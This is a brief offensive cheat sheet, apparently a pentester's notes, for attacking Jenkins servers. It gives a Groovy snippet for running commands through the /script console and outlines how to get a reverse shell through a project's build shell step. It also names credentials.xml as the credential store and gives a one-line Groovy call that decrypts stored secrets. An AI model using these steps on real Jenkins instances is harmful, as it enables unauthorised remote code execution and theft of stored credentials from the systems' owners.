### code execution via groovy script <rhost>/script
```
def process = "<command>".execute()
println "Found text ${process.text}"
```

### code execution via now project
```
create new freestyle project > inside build section > set execute shell > paste reverse shell commando > build now
```

### code execution via configuration of project
```
open project > configure > paste command > save and built
```

### password hashes for jenkins
```
<jenkinsHome>/credentials.xml
```

### decrypt using groovy script console
```
println hudson.util.Secret.decrypt("{<hash>}")
```

